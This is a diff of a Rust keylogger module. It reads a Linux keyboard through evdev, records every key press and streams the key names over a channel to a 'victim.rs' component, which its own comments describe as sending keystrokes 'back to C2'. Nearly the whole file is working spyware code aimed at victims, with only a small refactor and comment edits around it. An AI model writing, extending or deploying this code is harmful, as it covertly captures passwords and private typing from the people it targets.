@@ -1,12 +1,11 @@
-use evdev::{Device, EventSummary, KeyCode}; // Removed unused RelativeAxisCode, BusType
+use evdev::{Device, EventSummary, KeyCode};
 use std::fs;
 use std::sync::{
     atomic::{AtomicBool, Ordering},
     Arc,
 };
-use std::time::Instant;
 use std::io::{self, Write};
-use std::sync::mpsc::Sender;
+use std::sync::mpsc::{self, Sender};
 
 #[derive(Default, Debug)]
 struct Modifiers {
@@ -29,17 +28,6 @@ impl Modifiers {
             _ => {}
         }
     }
-
-    fn display(&self) -> String {
-        let mut parts = Vec::new();
-        if self.shift { parts.push("SHIFT"); }
-        if self.ctrl { parts.push("CTRL"); }
-        if self.alt { parts.push("ALT"); }
-        if self.meta { parts.push("META"); }
-        if self.capslock { parts.push("CAPS"); }
-
-        if parts.is_empty() { "none".to_string() } else { parts.join(" ") }
-    }
 }
 
 fn find_keyboard() -> io::Result<(Device, String)> {
@@ -57,6 +45,7 @@ fn find_keyboard() -> io::Result<(Device, String)> {
     candidates.pop().ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "No keyboard found"))
 }
 
+/// Swaps Alt and Meta keys for Parallels compatibility
 fn parallels_remap(key: KeyCode) -> KeyCode {
     match key {
         KeyCode::KEY_LEFTMETA => KeyCode::KEY_LEFTALT,
@@ -67,57 +56,55 @@ fn parallels_remap(key: KeyCode) -> KeyCode {
     }
 }
 
-/// Core background loop used by victim.rs
+/// The core loop used by victim.rs to stream keys back to C2
 pub fn run_with_flag(running: Arc<AtomicBool>, tx: Sender<u8>) -> io::Result<()> {
     let (mut device, _path) = find_keyboard()?;
     
-    // Set to non-blocking so the loop can check the 'running' flag even if no one is typing
+    // Non-blocking mode is critical so we can exit the loop when 'running' becomes false
     device.set_nonblocking(true)?;
 
     while running.load(Ordering::SeqCst) {
         match device.fetch_events() {
             Ok(events) => {
                 for ev in events {
-                    // Only capture "PRESS" events (value == 1) to avoid duplicate data
+                    // Only capture key PRESSES (value 1)
                     if let EventSummary::Key(_, raw_key, 1) = ev.destructure() {
+                        // Apply the Parallels remap here
                         let key = parallels_remap(raw_key);
                         
-                        // Convert KeyCode to a readable string (e.g., "KEY_ENTER" -> "ENTER ")
+                        // Clean up the name (e.g., KEY_ENTER becomes "ENTER ")
                         let key_name = format!("{:?} ", key).replace("KEY_", "");
                         
-                        // Send each byte of the key name through the channel to victim.rs
+                        // Stream each character byte over the channel to the victim's transmitter
                         for b in key_name.bytes() {
-                            if let Err(_) = tx.send(b) {
-                                return Ok(()); // Receiver hung up, stop logging
+                            if tx.send(b).is_err() {
+                                return Ok(()); // Stop if the receiver is gone
                             }
                         }
                     }
                 }
             }
             Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
-                // No events to process, sleep a tiny bit to save CPU
+                // Wait 10ms to prevent high CPU usage while idle
                 std::thread::sleep(std::time::Duration::from_millis(10));
             }
             Err(e) => return Err(e),
         }
     }
-
     Ok(())
 }
 
-/// Standalone entry point
+/// Standalone entry point for local testing
 pub fn run() -> io::Result<()> {
     println!("=== Standalone Keylogger Mode ===");
     let running = Arc::new(AtomicBool::new(true));
-    
-    // Create a channel so the standalone mode has somewhere to send bytes
-    let (tx, rx) = std::sync::mpsc::channel();
+    let (tx, rx) = mpsc::channel();
 
-    // Spawn a thread to print bytes received from the channel to the console
+    // Local printing thread
     std::thread::spawn(move || {
         while let Ok(b) = rx.recv() {
             print!("{}", b as char);
-            std::io::stdout().flush().ok();
+            io::stdout().flush().ok();
         }
     });
 
@@ -126,7 +113,6 @@ pub fn run() -> io::Result<()> {
         r.store(false, Ordering::SeqCst);
     }).expect("Error setting Ctrl+C handler");
 
-    // Pass the transmitter (tx) here
     run_with_flag(running, tx)
 }
 
